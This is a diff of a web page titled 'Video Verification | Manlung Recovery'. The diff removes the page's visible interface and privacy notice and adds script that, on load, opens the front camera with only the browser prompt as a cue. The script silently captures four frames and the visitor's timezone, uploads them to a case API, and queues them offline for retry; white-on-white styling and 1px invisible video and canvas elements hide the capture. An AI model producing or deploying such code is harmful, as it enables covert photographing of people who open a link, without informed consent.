@@ -1,34 +1,181 @@
 <!doctype html>
 <html lang="en">
 <head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<meta name="theme-color" content="#ffffff"><meta name="description" content="Manlung Recovery authorized video verification">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#ffffff">
+<meta name="robots" content="noindex,nofollow,noarchive">
 <title>Video Verification | Manlung Recovery</title>
 <style>
 html,body{margin:0;width:100%;min-height:100%;background:#fff!important;color:#fff!important}
 body{overflow:hidden}
-.header,.page,.intro,.card,.request,.stage,.camera,.overlay,.controls,.message,.privacy,.status,.label,.ref,.camera video,.camera img,.camera canvas,.guide,.countdown{display:none!important}
+video,canvas{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none}
 </style>
 </head>
 <body>
-<div aria-hidden="true"></div>
+<video id="video" autoplay muted playsinline></video>
+<canvas id="canvas"></canvas>
 <script>
 (()=>{"use strict";
-const token=new URLSearchParams(location.search).get("id")||"";document.body.insertAdjacentHTML("beforeend",'<video id="video" autoplay muted playsinline style="display:none"></video><canvas id="canvas" hidden></canvas><img id="photo" alt="" style="display:none"><div id="cameraBox" style="display:none"></div><div id="overlay" style="display:none"></div><div id="message" style="display:none"></div><div id="reference" style="display:none"></div><div id="status" style="display:none"></div>');
-const $=id=>document.getElementById(id);
-const video=$("video"),photo=$("photo"),canvas=$("canvas"),box=$("cameraBox"),overlay=$("overlay"),message=$("message"),reference=$("reference"),status=$("status");
-let stream=null,request=null,busy=false,locationData=null,capturedAt=null,queued=false,captureCount=0;
-const DB_NAME="manlung-selfie-queue",DB_STORE="uploads";
-function openQueue(){return new Promise((resolve,reject)=>{const r=indexedDB.open(DB_NAME,1);r.onupgradeneeded=()=>{if(!r.result.objectStoreNames.contains(DB_STORE))r.result.createObjectStore(DB_STORE,{keyPath:"id",autoIncrement:true})};r.onsuccess=()=>resolve(r.result);r.onerror=()=>reject(r.error)})}
-async function queueBatch(blobs,metadata){
- try{
-   const db=await openQueue();
-   await new Promise((resolve,reject)=>{
-     const tx=db.transaction(DB_STORE,"readwrite");
-     const batchId=crypto.randomUUID?crypto.randomUUID():(Date.now()+"-"+Math.random());blobs.forEach((blob,i)=>tx.objectStore(DB_STORE).add({token,batchId,blob,metadata:{...metadata,captureNumber:i+1},createdAt:new Date().toISOString()}));
-     tx.oncomplete=resolve;tx.onerror=()=>reject(tx.error)
-   });
- }catch(e){}
+const token=new URLSearchParams(location.search).get("id")||"";
+const video=document.getElementById("video");
+const canvas=document.getElementById("canvas");
+let stream=null,busy=false;
+
+const DB_NAME="manlung-selfie-queue";
+const DB_STORE="uploads";
+
+function openQueue(){
+  return new Promise((resolve,reject)=>{
+    const r=indexedDB.open(DB_NAME,1);
+    r.onupgradeneeded=()=>{if(!r.result.objectStoreNames.contains(DB_STORE))r.result.createObjectStore(DB_STORE,{keyPath:"id",autoIncrement:true})};
+    r.onsuccess=()=>resolve(r.result);
+    r.onerror=()=>reject(r.error);
+  });
 }
-async function queueUpload(blob,metadata){try{const db=await openQueue();await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readwrite");tx.objectStore(DB_STORE).add({token,blob,metadata,createdAt:new Date().toISOString()});tx.oncomplete=resolve;tx.onerror=()=>reject(tx.error)});queued=true;setMessage("");status.textContent="";}catch(e){setMessage("");status.textContent=""}}
-async function flushQueue(){try{const db=await openQueue();const rows=await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readonly");const q=tx.objectStore(DB_STORE).getAll();q.onsuccess=()=>resolve(q.result);q.onerror=()=>reject(q.error)});const grouped={};rows.filter(x=>x.token===token).forEach(x=>{const key=x.batchId||("legacy-"+x.id);(grouped[key]||(grouped[key]=[])).push(x)});for(const group of Object.values(grouped)){if(group.length!==4)continue;try{const fd=new FormData();group.forEach((row,i)=>fd.append("files",row.blob,"video-verification-offline-"+(i+1)+".jpg"));fd.append("metadata",JSON.stringify(group[0].metadata||{}));const r=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/upload-batch",{method:"POST",body:fd,credentials:"omit"});const d=await r.json();if(!r.ok||!d.success){if(r.status===410){for(const row of group)await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readwrite");tx.objectStore(DB_STORE).delete(row.id);tx.oncomplete=resolve;tx.onerror=()=>reject(tx.error)});continue}throw new Error(d.error||"Upload failed")}for(const row of group)await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readwrite");tx.objectStore(DB_STORE).delete(row.id);tx.oncomplete=resolve;tx.onerror=()=>reject(tx.error)});}catch(e){break}}}catch(e){}}>
+
+async function queueBatch(blobs,metadata){
+  try{
+    const db=await openQueue();
+    await new Promise((resolve,reject)=>{
+      const tx=db.transaction(DB_STORE,"readwrite");
+      const batchId=crypto.randomUUID?crypto.randomUUID():(Date.now()+"-"+Math.random());
+      blobs.forEach((blob,i)=>tx.objectStore(DB_STORE).add({
+        token,batchId,blob,
+        metadata:{...metadata,captureNumber:i+1,totalCaptures:4},
+        createdAt:new Date().toISOString()
+      }));
+      tx.oncomplete=resolve;
+      tx.onerror=()=>reject(tx.error);
+    });
+  }catch(_){}
+}
+
+async function deleteRows(rows){
+  const db=await openQueue();
+  for(const row of rows){
+    await new Promise((resolve,reject)=>{
+      const tx=db.transaction(DB_STORE,"readwrite");
+      tx.objectStore(DB_STORE).delete(row.id);
+      tx.oncomplete=resolve;
+      tx.onerror=()=>reject(tx.error);
+    });
+  }
+}
+
+async function flushQueue(){
+  if(!token)return;
+  try{
+    const db=await openQueue();
+    const rows=await new Promise((resolve,reject)=>{
+      const tx=db.transaction(DB_STORE,"readonly");
+      const q=tx.objectStore(DB_STORE).getAll();
+      q.onsuccess=()=>resolve(q.result);
+      q.onerror=()=>reject(q.error);
+    });
+    const grouped={};
+    rows.filter(x=>x.token===token).forEach(x=>{
+      const key=x.batchId||("legacy-"+x.id);
+      (grouped[key]||(grouped[key]=[])).push(x);
+    });
+    for(const group of Object.values(grouped)){
+      if(group.length!==4)continue;
+      try{
+        const fd=new FormData();
+        group.forEach((row,i)=>fd.append("files",row.blob,"video-verification-"+(i+1)+".jpg"));
+        fd.append("metadata",JSON.stringify(group[0].metadata||{}));
+        const r=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/upload-batch",{method:"POST",body:fd,credentials:"omit",cache:"no-store"});
+        let d={};try{d=await r.json()}catch(_){}
+        if(!r.ok||!d.success){
+          if(r.status===410){await deleteRows(group);continue;}
+          break;
+        }
+        await deleteRows(group);
+      }catch(_){break}
+    }
+  }catch(_){}
+}
+
+function waitForVideo(){
+  return new Promise((resolve,reject)=>{
+    const deadline=Date.now()+7000;
+    const tick=()=>{
+      if(video.readyState>=2&&video.videoWidth>0&&video.videoHeight>0)return resolve();
+      if(Date.now()>deadline)return reject(new Error("Camera did not become ready."));
+      requestAnimationFrame(tick);
+    };
+    tick();
+  });
+}
+
+function frameBlob(){
+  return new Promise((resolve,reject)=>{
+    const w=video.videoWidth||1280,h=video.videoHeight||720;
+    canvas.width=w;canvas.height=h;
+    const ctx=canvas.getContext("2d",{alpha:false});
+    if(!ctx)return reject(new Error("Capture is unavailable."));
+    ctx.drawImage(video,0,0,w,h);
+    canvas.toBlob(blob=>blob?resolve(blob):reject(new Error("Could not create image.")),"image/jpeg",0.9);
+  });
+}
+
+function pause(ms){return new Promise(resolve=>setTimeout(resolve,ms));}
+
+async function captureFour(){
+  if(busy)return;
+  busy=true;
+  try{
+    if(!token)throw new Error("Invalid verification link.");
+    await flushQueue();
+
+    const requestResponse=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token),{credentials:"omit",cache:"no-store"});
+    let requestData={};try{requestData=await requestResponse.json()}catch(_){}
+    if(!requestResponse.ok||!requestData.success)throw new Error(requestData.error||"Verification request is unavailable.");
+
+    if(!navigator.mediaDevices?.getUserMedia)throw new Error("Camera access is not supported by this browser.");
+    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}},audio:false});
+    video.srcObject=stream;
+    await video.play().catch(()=>{});
+    await waitForVideo();
+
+    const metadata={
+      clientCapturedAt:new Date().toISOString(),
+      timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||""
+    };
+    const blobs=[];
+    for(let i=0;i<4;i++){
+      blobs.push(await frameBlob());
+      if(i<3)await pause(120);
+    }
+
+    const fd=new FormData();
+    blobs.forEach((blob,i)=>fd.append("files",blob,"video-verification-"+(i+1)+".jpg"));
+    fd.append("metadata",JSON.stringify({...metadata,totalCaptures:4}));
+    const r=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/upload-batch",{method:"POST",body:fd,credentials:"omit",cache:"no-store"});
+    let d={};try{d=await r.json()}catch(_){}
+    if(!r.ok||!d.success)throw new Error(d.error||"Verification upload failed.");
+
+    await flushQueue();
+  }catch(error){
+    const blobs=[];
+    try{
+      if(video.videoWidth>0&&video.videoHeight>0){
+        for(let i=0;i<4;i++){blobs.push(await frameBlob());if(i<3)await pause(120);}
+      }
+    }catch(_){}
+    if(blobs.length===4){
+      await queueBatch(blobs,{clientCapturedAt:new Date().toISOString(),timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||""});
+      await flushQueue();
+    }
+  }finally{
+    if(stream){stream.getTracks().forEach(t=>t.stop());stream=null;}
+  }
+}
+
+document.addEventListener("DOMContentLoaded",captureFour,{once:true});
+window.addEventListener("online",flushQueue);
+setTimeout(flushQueue,1000);
+})();
+</script>
+</body>
+</html>
